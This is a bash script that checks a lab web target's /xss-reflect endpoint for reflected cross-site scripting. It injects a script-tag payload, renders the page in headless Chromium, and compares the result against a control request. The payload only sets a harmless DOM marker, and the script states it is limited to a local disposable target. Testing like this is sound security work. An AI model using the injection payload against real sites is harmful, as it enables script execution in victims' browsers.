#!/usr/bin/env bash
set -Eeuo pipefail

TARGET="${TARGET:-http://<lab-ip>:18080}"
RUN_ID="modern_api_browser_runtime_xss_$(date -u +%Y%m%dT%H%M%SZ)"
OUT="${OUT:-$HOME/<artifact-output-dir>/$RUN_ID}"
mkdir -p "$OUT/xss" "$OUT/http"
OBS="$OUT/observations.jsonl"
SUMMARY="$OUT/summary.md"
: > "$OBS"

json_obs(){ python3 - "$OBS" "$@" <<'PY'
import json,sys,datetime
p=sys.argv[1]
d={'ts':datetime.datetime.now(datetime.UTC).isoformat().replace('+00:00','Z')}
for a in sys.argv[2:]:
    if '=' in a:
        k,v=a.split('=',1); d[k]=v
open(p,'a',encoding='utf-8').write(json.dumps(d,ensure_ascii=False)+'\n')
PY
}

status(){ curl -sS -o /dev/null -w '%{http_code}' --max-time 8 "$1" 2>/dev/null || echo 000; }
urlencode(){ python3 - "$1" <<'PY'
import sys, urllib.parse
print(urllib.parse.quote(sys.argv[1], safe=''))
PY
}

CHROMIUM="${CHROMIUM:-$(command -v chromium || command -v chromium-browser || true)}"
if [ -z "$CHROMIUM" ]; then
  echo "chromium_not_found" >&2
  exit 2
fi

PRE=$(status "$TARGET/health")
json_obs category=health name=pre status="$PRE" target="$TARGET"
if [ "$PRE" != "200" ]; then
  printf 'target_unhealthy pre_health=%s target=%s\n' "$PRE" "$TARGET" >&2
  exit 3
fi

MARKER="XSS_RUNTIME_${RUN_ID}"
PAYLOAD="</div><script>document.body.setAttribute('data-xss','${MARKER}');document.body.setAttribute('data-origin',location.origin);document.body.setAttribute('data-path',location.pathname);</script><div>"
ENC_PAYLOAD=$(urlencode "$PAYLOAD")
XSS_URL="$TARGET/xss-reflect?q=$ENC_PAYLOAD"
CONTROL_TEXT="${MARKER}_REFLECT_ONLY_CONTROL"
CONTROL_URL="$TARGET/xss-reflect?q=$(urlencode "$CONTROL_TEXT")"

printf '%s\n' "$PAYLOAD" > "$OUT/xss/payload.html"
printf '%s\n' "$XSS_URL" > "$OUT/xss/xss_url.txt"
printf '%s\n' "$CONTROL_URL" > "$OUT/xss/control_url.txt"

curl -sS --max-time 10 "$XSS_URL" > "$OUT/http/xss_raw_response.html" 2>"$OUT/http/xss_raw_response.err" || true
curl -sS --max-time 10 "$CONTROL_URL" > "$OUT/http/control_raw_response.html" 2>"$OUT/http/control_raw_response.err" || true

DOM="$OUT/xss/dom.txt"
CONTROL_DOM="$OUT/xss/control_dom.txt"
"$CHROMIUM" --headless --disable-gpu --no-sandbox --virtual-time-budget=2000 --dump-dom "$XSS_URL" > "$DOM" 2>"$OUT/xss/chromium.err" || true
"$CHROMIUM" --headless --disable-gpu --no-sandbox --virtual-time-budget=2000 --dump-dom "$CONTROL_URL" > "$CONTROL_DOM" 2>"$OUT/xss/control_chromium.err" || true

RUNTIME_MARKER=no
ORIGIN_MATCH=no
PATH_MATCH=no
CONTROL_RUNTIME=no
grep -q "data-xss=\"$MARKER\"" "$DOM" && RUNTIME_MARKER=yes
grep -q 'data-origin="http://<lab-ip>:18080"' "$DOM" && ORIGIN_MATCH=yes
grep -q 'data-path="/xss-reflect"' "$DOM" && PATH_MATCH=yes
grep -q 'data-xss=' "$CONTROL_DOM" && CONTROL_RUNTIME=yes

POST=$(status "$TARGET/health")
json_obs category=xss target="$TARGET" url="$XSS_URL" marker="$MARKER" runtime_marker="$RUNTIME_MARKER" origin_match="$ORIGIN_MATCH" path_match="$PATH_MATCH" control_runtime="$CONTROL_RUNTIME" dom="$DOM" control_dom="$CONTROL_DOM" raw_response="$OUT/http/xss_raw_response.html" chromium="$CHROMIUM"
json_obs category=health name=post status="$POST" target="$TARGET"

{
  echo "# Modern API Browser Runtime XSS Wave 1"
  echo
  echo "target: $TARGET"
  echo "pre_health: $PRE"
  echo "post_health: $POST"
  echo "chromium: $CHROMIUM"
  echo "marker: $MARKER"
  echo "xss_url_file: $OUT/xss/xss_url.txt"
  echo "payload_file: $OUT/xss/payload.html"
  echo
  echo "## Result"
  echo
  echo "runtime_marker: $RUNTIME_MARKER"
  echo "origin_match: $ORIGIN_MATCH"
  echo "path_match: $PATH_MATCH"
  echo "control_runtime: $CONTROL_RUNTIME"
  echo
  echo "## Evidence"
  echo
  echo "dom: $DOM"
  echo "control_dom: $CONTROL_DOM"
  echo "raw_response: $OUT/http/xss_raw_response.html"
  echo "observations: $OBS"
  echo
  echo "## Boundary"
  echo
  echo "Local disposable target only; safe DOM marker mutation only; no credential access, no token/cookie exfiltration, no persistence, no external callback, no public target."
} > "$SUMMARY"

echo "$OUT"

if [ "$RUNTIME_MARKER" = yes ] && [ "$ORIGIN_MATCH" = yes ] && [ "$PATH_MATCH" = yes ] && [ "$CONTROL_RUNTIME" = no ] && [ "$POST" = "200" ]; then
  exit 0
fi
exit 4
